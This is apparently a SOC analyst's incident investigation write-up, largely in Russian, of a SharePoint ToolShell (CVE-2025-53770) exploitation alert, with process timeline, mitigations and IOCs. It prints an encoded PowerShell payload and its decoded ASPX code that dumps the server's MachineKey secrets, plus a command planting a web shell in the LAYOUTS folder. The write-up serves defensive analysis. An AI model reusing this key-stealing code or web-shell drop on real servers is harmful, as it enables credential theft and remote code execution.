# Description
A critical zero-day vulnerability named ToolShell (CVE-2025-53770) has been discovered in on-premises SharePoint Server deployments.
***
# Basic Information
```
EventID: 320
Event Time: Jul, 22, 2025, 01:07 PM
Rule: SOC342 - CVE‑2025‑53770 SharePoint ToolShell Auth Bypass and RCE
Level: Security Analyst
Hostname: SharePoint01
Source IP Address: 107.191.58.76
Destination IP Address: 172.16.20.17
HTTP Request Method: POST
Requested URL: /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Referer: /_layouts/SignOut.aspx
Content-Length: 7699
Alert Trigger Reason: Suspicious unauthenticated POST request targeting ToolPane.aspx with large payload size and spoofed referer indicative of CVE-2025-53770 exploitation.
Device Action: Allowed
```
***
# Investigation

Согласно информации с хоста 2025-07-22 13:07:11.000 был запущен процесс: C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\bin\w3wp.exe
Родительский процесс: C:\Windows\System32\services.exe
Файл w3wp.exe — это исполняемый файл, относящийся к системе Microsoft Internet Information Services (IIS), то есть к веб-серверу, встроенному в Windows Server. Полное название процесса — IIS Worker Process. Его основная задача — обработка веб-запросов, поступающих на сервер; выполнение кода веб-приложений и формирование ответов для браузеров пользователей.
Действие выполнялось под учетной записью: IIS APPPOOL\SharePoint - 80

<img width="1663" height="375" alt="image" src="https://github.com/user-attachments/assets/b1bd4a08-4644-4813-842b-d19650bc7dc2" />

Далее в 2025-07-22 13:07:24.000 был зафиксирован запуск обфусцированный Powershell-команды.

<img width="1678" height="358" alt="image" src="https://github.com/user-attachments/assets/b6e89326-b8bf-43f2-acdd-4e609cd3fe0e" />

Обфусцированная команда:
```
powershell.exe -nop -w hidden -e PCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5EaWFnbm9zdGljcyIgJT4NCjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uSU8iICU+DQo8c2NyaXB0IHJ1bmF0PSJzZXJ2ZXIiIGxhbmd1YWdlPSJjIyIgQ09ERVBBR0U9IjY1MDAxIj4NCiAgICBwdWJsaWMgdm9pZCBQYWdlX2xvYWQoKQ0KICAgIHsNCgkJdmFyIHN5ID0gU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkuTG9hZCgiU3lzdGVtLldlYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWIwM2Y1ZjdmMTFkNTBhM2EiKTsNCiAgICAgICAgdmFyIG1rdCA9IHN5LkdldFR5cGUoIlN5c3RlbS5XZWIuQ29uZmlndXJhdGlvbi5NYWNoaW5lS2V5U2VjdGlvbiIpOw0KICAgICAgICB2YXIgZ2FjID0gbWt0LkdldE1ldGhvZCgiR2V0QXBwbGljYXRpb25Db25maWciLCBTeXN0ZW0uUmVmbGVjdGlvbi5CaW5kaW5nRmxhZ3MuU3RhdGljIHwgU3lzdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzLk5vblB1YmxpYyk7DQogICAgICAgIHZhciBjZyA9IChTeXN0ZW0uV2ViLkNvbmZpZ3VyYXRpb24uTWFjaGluZUtleVNlY3Rpb24pZ2FjLkludm9rZShudWxsLCBuZXcgb2JqZWN0WzBdKTsNCiAgICAgICAgUmVzcG9uc2UuV3JpdGUoY2cuVmFsaWRhdGlvbktleSsifCIrY2cuVmFsaWRhdGlvbisifCIrY2cuRGVjcnlwdGlvbktleSsifCIrY2cuRGVjcnlwdGlvbisifCIrY2cuQ29tcGF0aWJpbGl0eU1vZGUpOw0KICAgIH0NCjwvc2NyaXB0Pg==
```
Деобфусцированная команда:
```
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server" language="c#" CODEPAGE="65001">
    public void Page_load()
    {
		var sy = System.Reflection.Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
        var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
        var gac = mkt.GetMethod("GetApplicationConfig", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
        var cg = (System.Web.Configuration.MachineKeySection)gac.Invoke(null, new object[0]);
        Response.Write(cg.ValidationKey+"|"+cg.Validation+"|"+cg.DecryptionKey+"|"+cg.Decryption+"|"+cg.CompatibilityMode);
    }
</script>
```
После деобфускации мы получили характерный код для получения информации об MachineKeySection. Получив значение ключа потенциальные злоумышленники могут отправлять удаленные команды (реализовать RCE). 

Затем в 2025-07-22 13:07:27.000 зафиксирован запуск команды:
csc.exe /out:C:\Windows\Temp\payload.exe C:\Windows\Temp\payload.cs
Родителем которого яв-ся вышеупомянутый Powershell команда. 
Команда запускает компилятор C# командной строки (csc.exe) для компиляции исходного файла на языке C# (payload.cs), расположенного в папке C:\Windows\Temp. В результате выполнения этой команды будет создан исполняемый файл (payload.exe) в той же директории. C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe - это официальный компилятор C# от Microsoft. 
<img width="1662" height="328" alt="image" src="https://github.com/user-attachments/assets/f3c1de39-a707-42e1-b3ad-ef72e2a773d8" />

Также от процесса C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe зафиксирован запуск команды:
cmd.exe /c echo <WebShell> > C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx
Данная команда предназначена для записи содержимого web-shell в веб-директорию серверного приложения.
<img width="1648" height="368" alt="image" src="https://github.com/user-attachments/assets/c84c8e89-95ff-4e1c-81a6-4643d85e3287" />
<img width="1671" height="334" alt="image" src="https://github.com/user-attachments/assets/7c3890da-c19c-468b-b7cf-41915b8bd139" />

Далее злоумышленник получил интерактивную сессию, т.к. родительским процессом для следующих запусков является:
C:\Windows\explorer.exe
Запускаемые процессы и команды:
- "C:\Program Files\Google\Chrome\Application\chrome.exe" --flag-switches-begin
- notepad.exe C:\temp\notes.txt
- cmd.exe /c dir C:\Windows\Temp
Действие выполнялось под учетной записью: SHAREPOINT01\Administrator

<img width="1679" height="330" alt="image" src="https://github.com/user-attachments/assets/7450323e-3fb2-4806-9c35-a18f4f9beddf" />
<img width="1577" height="329" alt="image" src="https://github.com/user-attachments/assets/0c9adae8-2d90-40f1-aab7-d345789e4a1e" />
<img width="1602" height="325" alt="image" src="https://github.com/user-attachments/assets/ad2d9771-5250-4f87-9cd5-cecac5718f4d" />


В 2025-07-22 13:12:10.000 зафиксирован запуск Powershell-команды:
powershell.exe -Command Get-Process
Родительский процесс: C:\Windows\System32\cmd.exe
<img width="1611" height="336" alt="image" src="https://github.com/user-attachments/assets/288d4ac0-ceda-466e-8aca-6ea47fcf5216" />

**Описанные события подтверждают успешную эксплуатацию уязвимости CVE-2025-53770**. 

# Mitigations: 
1) Заблокировать на МСЭ сетевое взаимодействие с IP-адресом 107.191.58[.]76
2) Изолировать хост SharePoint01 (172.16.20.17) и заблокировать УЗ IIS APPPOOL\SharePoint - 80. 
3) Отключить встроенную учетную запись с помощью удаленного выполнения команды: net user Administrator /active:no. После сменить пароль учетной записи SHAREPOINT01\Administrator
4) Выслать на анализ потенциально опасные файлы в архиве, с паролем "***".
5) Провести сканирование АВПО.
***
# IOC's:
Sorce IP address: 107.191.58[.]76

Malicious Payload: C:\Windows\Temp\payload.exe, C:\Windows\Temp\payload.cs
